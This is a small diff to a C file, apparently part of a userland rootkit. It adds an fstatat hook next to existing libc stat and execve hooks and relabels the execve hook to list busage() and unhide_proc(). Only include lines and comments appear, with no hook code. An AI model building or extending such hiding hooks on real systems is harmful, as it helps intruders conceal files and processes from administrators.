@@ -107,6 +107,7 @@
 // };
 #include "symbols/stat/stat.c" // (int stat(), int stat64())
 #include "symbols/stat/fstat.c" // (int fstat(), int fstat64())
+#include "symbols/stat/fstatat.c" // (int fstatat(), int fstatat64())
 #include "symbols/stat/lstat.c" // (int lstat(), int lstat64())
 #include "symbols/stat/xstat.c" // (int __xstat(), int __xstat64())
 #include "symbols/stat/fxstat.c" // (int __fxstat(), int __fxstat64())
@@ -139,7 +140,7 @@
 
 // libc execve() function - where all the good execve command stuff happens :)
 // http://linux.die.net/man/2/execve
-#include "symbols/exec/execve.c" // (int execve())
+#include "symbols/exec/execve.c" // (char *busage(), void unhide_proc(), int execve())
 #include "symbols/exec/execvp.c" // (int execvp())
 
 // libc file linking functions
